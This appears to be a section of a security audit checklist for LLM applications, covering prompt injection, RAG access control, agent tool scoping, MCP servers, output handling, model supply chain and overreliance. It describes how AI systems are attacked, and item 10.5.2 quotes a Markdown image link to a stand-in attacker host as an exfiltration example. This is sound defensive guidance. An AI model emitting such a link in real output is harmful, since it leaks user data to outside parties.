## 10.1 Prompt Injection Prevention (Direct & Indirect) · LLM01, LLM07
- [ ] **10.1.1** **Instruction/Data Separation**: System instructions and untrusted data (user prompts, retrieved RAG chunks, emails, scraped HTML, git issues) use structured message roles (`system` / `developer` vs `user`) and rigid XML/JSON data delimiters (e.g., `<untrusted_document>...</untrusted_document>`) rather than raw string concatenation (`f"{system_prompt}\n{user_input}"`).
- [ ] **10.1.2** **Input Normalization & Screening**: Decode/normalize Unicode homoglyphs, zero-width characters, and base64 tricks before running input classifiers/guardrail firewalls (never rely on naive keyword blocklists alone).
- [ ] **10.1.3** **Treat External Content as Hostile**: Emails, PDFs, Slack messages, PR descriptions, web fetches, and database text fed to an LLM are treated as untrusted data susceptible to indirect prompt injection.
- [ ] **10.1.4** **System Prompt Non-Reliance**: Secrets, API keys, authorization rules, and confidential business logic are NEVER stored inside the system prompt — assume system prompts can be leaked.

## 10.2 RAG Pipeline & Vector Database Security · LLM08, LLM04, LLM02
- [ ] **10.2.1** **Chunk-Level Access Control (ABAC/RBAC)**: Every vector chunk carries permission/tenant ACL metadata, and vector DB queries enforce authorization filtering *inside the retrieval query* (e.g., `filter={"tenant_id": user.tenant_id, "acl": {"$in": user.roles}}`) — NEVER post-filter only at the UI or rely on semantic search to stay within a tenant!
- [ ] **10.2.2** **Document Ingestion Hygiene**: Validate document provenance/integrity and scan ingested files for hidden text (white-on-white PDF text, HTML comments, steganography, embedded prompt overrides) before embedding.
- [ ] **10.2.3** **PII & Secret Redaction**: Detect and redact/classify secrets and unnecessary PII prior to indexing documents into shared vector stores.
- [ ] **10.2.4** **Vector Store Hardening**: Vector databases (pgvector, Pinecone, Qdrant, Weaviate, Chroma) enforce authentication, TLS, encryption at rest, and strict network isolation (never unauthenticated on public ports) to prevent corpus theft or embedding-inversion attacks.
- [ ] **10.2.5** **Context Tampering / Poisoning Monitoring**: Track document uploaders/sources and audit sudden retrieval-ranking anomalies (RAG poisoning).

## 10.3 AI Agents, Tool Calling & Loop Prevention ("Find Out the Loop") · LLM06, LLM10
- [ ] **10.3.1** **Least-Privilege Tool Scoping**: Agents only receive minimal read-only or tightly scoped tools required for the task; never attach arbitrary shell, filesystem write, or raw SQL admin tools unless strictly isolated in ephemeral sandboxes.
- [ ] **10.3.2** **Externalize Authorization (Never Trust Model Reasoning)**: Tool wrappers validate permissions against the caller's verified session/token — NEVER trust parameters generated by the LLM (e.g., `user_id` supplied by LLM in a tool call!) without server-side ownership checks (prevents AI-driven IDOR/BOLA).
- [ ] **10.3.3** **Human-in-the-Loop (HITL) Gates**: High-impact, destructive, financial, external-messaging, or state-changing tool calls (`send_email`, `delete_record`, `transfer_funds`, `git_push`, `run_sql_write`) require explicit out-of-band human confirmation before execution.
- [ ] **10.3.4** **Runaway Agent Loop & Denial-of-Wallet (DoW) Guards**:
  - Enforce hard `max_iterations` / `recursion_limit` / max tool calls per turn and per session.
  - Detect repeated identical tool-call cycles (circular reasoning loops) and fail closed.
  - Enforce per-request timeouts, max input/output token budgets, and per-user/per-tenant cost & rate caps.
- [ ] **10.3.5** **Agent Memory Poisoning Defense**: Scope episodic/long-term agent memory strictly per user/tenant and sanitize before persisting so one session cannot poison future sessions or other users.

## 10.4 MCP (Model Context Protocol) Security · LLM06, LLM03 [SKIP IF NOT USING MCP]
- [ ] **10.4.1** **Mandatory Tool Execution Auth**: Every MCP tool invocation enforces authentication, authorization, and policy validation — never rely on client-side agent prompt rules alone.
- [ ] **10.4.2** **Strict Input Schemas & Command Safety**: MCP server tool handlers validate strict schemas (JSON Schema/Zod/Pydantic), block path traversal (`../`), block SSRF targets, and never interpolate LLM arguments into shell commands or raw SQL.
- [ ] **10.4.3** **Sandboxed Execution**: Local/remote MCP servers run as non-root inside isolated containers/sandboxes with minimal filesystem/network access.
- [ ] **10.4.4** **Prevent Toxic Agent Flows & Dynamic Discovery**: Block agents from auto-registering untrusted remote MCP servers or modifying `.mcp.json` / `mcp_config.json` without explicit human review; validate MCP tool descriptions against hidden prompt-injection payloads (tool poisoning / rug-pull checks).

## 10.5 LLM Output Handling & Data Protection · LLM05, LLM02
- [ ] **10.5.1** **Improper Output Handling Defense**: Sanitize LLM output before rendering in browsers (XSS via Markdown/HTML links or `<script>`), and validate strictly before passing to SQL/code/HTML/API sinks.
- [ ] **10.5.2** **Output Guardrails & Exfiltration Checks**: Inspect responses for leaked secrets, PII, Markdown image/link exfiltration (`![img](https://evil.com/leak?data=...)`), and unauthorized tool calls; fail closed on anomalies.
- [ ] **10.5.3** **Server-Side Keys Only**: LLM provider keys (`OPENAI_API_KEY`, `ANTHROPIC_API_KEY`, `GEMINI_API_KEY`) live strictly server-side, never in client JS/mobile bundles; prompt logging excludes secrets and honors retention policies.

## 10.6 Model & AI Supply Chain · LLM03, LLM04
- [ ] **10.6.1** **No remote code from model hubs**: `trust_remote_code=True` is not used, or the model is pinned to a reviewed commit (`revision="<sha>"`) and its code was read. (Scanner rule `LLM-01`.)
- [ ] **10.6.2** **Safe weight formats**: models load from `safetensors` / ONNX, or `torch.load(..., weights_only=True)`; pickled artifacts (`.pt`, `.pkl`, `.joblib`) come only from trusted, verified sources. (Scanner rule `LLM-02`.)
- [ ] **10.6.3** **Pinned and verified artifacts**: model, tokenizer, dataset and adapter (LoRA) downloads are pinned by version/hash and pulled from known publishers, not typo-squatted names.
- [ ] **10.6.4** **Fine-tuning and feedback data hygiene**: training, fine-tuning, and RLHF/feedback data come from controlled sources, are access-controlled, and are reviewed for poisoned or backdoor samples before use.
- [ ] **10.6.5** **Plugins, tools and MCP servers** are installed from reviewed sources at pinned versions, with an inventory (AI-BOM) of models, datasets and tools in use.

## 10.7 Misinformation & Overreliance · LLM09
- [ ] **10.7.1** Outputs used for decisions (medical, legal, financial, security, code changes) are grounded in retrieved sources with citations, and the UI shows the sources.
- [ ] **10.7.2** High-stakes outputs pass a validation step (schema checks, rules engine, or human review) before they take effect.
- [ ] **10.7.3** AI-generated code and package names are checked before install or merge (hallucinated packages enable "slopsquatting").
- [ ] **10.7.4** Users are told the content is AI-generated and may be wrong, where that matters.
